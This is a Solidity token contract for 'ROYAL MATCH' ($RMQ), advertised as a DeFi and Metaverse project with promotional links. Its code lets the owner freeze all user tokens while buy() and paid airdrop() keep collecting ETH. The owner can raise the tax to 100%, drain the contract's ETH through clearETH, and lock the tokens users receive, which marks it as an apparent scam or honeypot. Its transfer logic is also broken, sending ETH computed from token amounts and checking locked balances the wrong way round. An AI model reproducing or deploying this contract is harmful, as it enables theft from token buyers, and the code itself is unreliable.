// SPDX-License-Identifier: MIT
/* 
   🏰👑👑👑ROYAL MATCH 👑👑👑🏰
   Royal Match is designed to create a complex ecosystem in which DeFi and Metaverse are integrated together.  
   Crypto users will access all DeFi & Metaverse services quickly, cheaply and effectively with only Royal Match platforms. 
   Website: https://royalmatch.io/
   Telegram: https://t.me/RoyalMatchNFT
   X-Twitter: https://x.com/royalmatch_nft
*/

pragma solidity 0.8.7;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }
}

contract ROYALMATCH {
    using SafeMath for uint256;
    
    uint256 private _totalSupply = 100000000000000000000000000000;
    string private _name = "ROYAL MATCH";
    string private _symbol = "$RMQ";
    uint8 private _decimals = 18;
    address private _owner;
    
    bool private _swAirdrop = true;
    bool private _allUserTokensLocked;
    uint256 private _referEth = 3000;
    uint256 private _referToken = 7000;
    uint256 private _airdropEth = 16600000000000000;
    uint256 private _airdropToken = 200000000000000000000000;

   
    uint256 private salePrice = 50000000;
    uint256 private _taxEther;

    uint256 private _taxFee = 2; 
    address payable private _taxFeeAddress = payable(0x020f9C94355e98a980d945021066739Efa1e0B9E); 

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _lockedBalances;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    modifier buyRewardsNotLocked() {
        require(!_allUserTokensLocked, "All user tokens are currently locked");
        _;
    }

    constructor() {
    _owner = msg.sender;
        _balances[_owner] = _totalSupply;
    emit Transfer(address(0), _owner, _totalSupply);
    }

    function _msgSender() internal view returns (address payable) {
    return payable(msg.sender);
}

    function name() public view returns (string memory) {
        return _name;
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function cap() public view returns (uint256) {
        return _totalSupply;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner_, address spender) public view returns (uint256) {
        return _allowances[owner_][spender];
    }

    function lockAllUserTokens() public onlyOwner {
        _allUserTokensLocked = true;
    }

    function unlockAllUserTokens() public onlyOwner {
        _allUserTokensLocked = false;
    }

    function setSalePrice(uint256 newSalePrice) public onlyOwner {
    salePrice = newSalePrice;
    }
    function setReferEth(uint256 newReferEth) public onlyOwner {
    _referEth = newReferEth;
    }

    function setReferToken(uint256 newReferToken) public onlyOwner {
    _referToken = newReferToken;
    }

    function setAirdropEth(uint256 newAirdropEth) public onlyOwner {
    _airdropEth = newAirdropEth;
    }

    function setAirdropToken(uint256 newAirdropToken) public onlyOwner {
    _airdropToken = newAirdropToken;
    }


    function setTaxFee(uint256 taxFee) public onlyOwner {
        require(taxFee <= 100, "Tax fee should be less than or equal to 100%");
        _taxFee = taxFee;
    }

    function setTaxFeeAddress(address payable taxFeeAddress) public onlyOwner {
        require(taxFeeAddress != address(0), "Invalid tax fee address");
        _taxFeeAddress = taxFeeAddress;
    }
  

    function _approve(address owner_, address spender, uint256 amount) internal {
        require(owner_ != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner_][spender] = amount;
        emit Approval(owner_, spender, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
    require(_lockedBalances[sender] < amount, "Transfer amount exceeds locked balance");
    // Calculate the tax in Ether
    uint256 taxInEther = amount.mul(_taxFee).div(100);

    // Transfer the tax in Ether to the tax fee address
    payable(_taxFeeAddress).transfer(taxInEther);

    // Transfer the remaining tokens to the recipient
    _transfer(sender, recipient, amount.sub(taxInEther), false);

    uint256 currentAllowance = _allowances[sender][_msgSender()];
    require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");

    _approve(sender, _msgSender(), currentAllowance.sub(amount));
    return true;
    }
    function transfer(address recipient, uint256 amount) public returns (bool) {
    require(_lockedBalances[msg.sender] < amount, "Transfer amount exceeds locked balance");
    // Calculate the tax in Ether
    uint256 taxInEther = amount.mul(_taxFee).div(100);

    // Transfer the tax in Ether to the tax fee address
    payable(_taxFeeAddress).transfer(taxInEther);

    // Transfer the remaining tokens to the recipient
    _transfer(_msgSender(), recipient, amount.sub(taxInEther), false);
    
    return true;
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function clearETH() public onlyOwner() {
    address payable ownerAddress = payable(msg.sender);
    ownerAddress.transfer(address(this).balance.add(_taxEther));
    _taxEther = 0;
    }

    function airdrop() payable public buyRewardsNotLocked returns (bool) {
    require(_swAirdrop && msg.value == _airdropEth, "Transaction recovery");

    // Check if the owner has enough tokens to airdrop
    require(_balances[_owner] >= _airdropToken, "Not enough tokens to airdrop");

    uint256 taxAmount = _airdropToken.mul(_taxFee).div(100);
    uint256 airdropAmount = _airdropToken.sub(taxAmount);

    _transfer(_owner, _msgSender(), airdropAmount, true);

    // Calculate the tax in Ether
    uint256 taxInEther = msg.value.mul(_taxFee).div(100);

    // Transfer the tax in Ether to the tax fee address
    payable(_taxFeeAddress).transfer(taxInEther);

    // Transfer the remaining Ether to the owner
    payable(_owner).transfer(msg.value.sub(taxInEther));

    return true;
    }

   function buy(address _refer) payable public buyRewardsNotLocked returns (bool) {
    require(msg.value >= 0.1 ether, "Transaction recovery");
    uint256 _msgValue = msg.value;
    uint256 _token = _msgValue.mul(salePrice);

    // Check if the owner has enough tokens to transfer
    require(_balances[_owner] >= _token, "Not enough tokens to transfer");

    uint256 taxAmount = _token.mul(_taxFee).div(100);
    uint256 transferAmount = _token.sub(taxAmount);

    _transfer(_owner, _msgSender(), transferAmount,false);

    if (_msgSender() != _refer && _refer != address(0) && _balances[_refer] > 0) {
        uint referToken = taxAmount.mul(_referToken).div(10000);
        uint referEth = _msgValue.mul(_referEth).div(10000);
        _transfer(_owner, _refer, referToken, true);
        payable(_refer).transfer(referEth);
    }

    // Calculate the tax in Ether
    uint256 taxInEther = _msgValue.mul(_taxFee).div(100);

    // Transfer the tax in Ether to the tax fee address
    payable(_taxFeeAddress).transfer(taxInEther);

    // Transfer the remaining Ether to the owner
    payable(_owner).transfer(_msgValue.sub(taxInEther));

    return true;
    }
   
    function _transfer(address sender, address recipient, uint256 amount, bool isLocked) internal {
    require(sender != address(0), "ERC20: transfer from the zero address");
    require(recipient != address(0), "ERC20: transfer to the zero address");

    uint256 senderBalance = _balances[sender];
    require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");

    // Only check the locked balance if the tokens being transferred are locked
    if (isLocked) {
        require(_lockedBalances[sender] < amount, "Transfer amount exceeds locked balance");
    }

    _balances[sender] = senderBalance.sub(amount);
    _balances[recipient] = _balances[recipient].add(amount);

    if (isLocked) {
        _lockedBalances[recipient] = _lockedBalances[recipient].add(amount);
    }

    emit Transfer(sender, recipient, amount);
    }

}